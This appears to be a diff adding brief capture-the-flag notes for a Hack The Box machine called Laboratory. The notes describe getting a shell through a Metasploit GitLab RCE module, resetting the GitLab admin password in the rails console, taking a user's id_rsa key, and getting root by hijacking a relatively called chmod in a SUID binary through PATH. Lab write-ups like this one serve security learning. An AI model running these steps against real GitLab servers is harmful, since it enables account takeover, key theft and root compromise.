@@ -1,0 +1,38 @@
+we found a subdomain git
+
+we used metasploit ==git_rce_shell== to get a shell
+
+there is also a manual way `https://0xdf.gitlab.io/2021/04/17/htb-laboratory.html`
+
+then we found
+
+`/etc/gitlab/gitlab.rb` file
+
+```
+bash -i
+gitlab-rails console
+irb will open up
+user=User.find(1)
+user.password = “87654321”
+user.password_confirmation = “87654321”
+user.save!
+```
+
+on sigining in again after log out we see admin settings and we can switch to dexter and get his ==id_rsa==
+
+now we get user.txt
+
+for root we saw docker-security on
+
+`find / -perm -4000 2>/dev/null`
+
+we found ==chmod== is being called without absolute path
+
+so we did
+
+```
+#!/bin/bash 
+/bin/bash
+```
+
+and got root
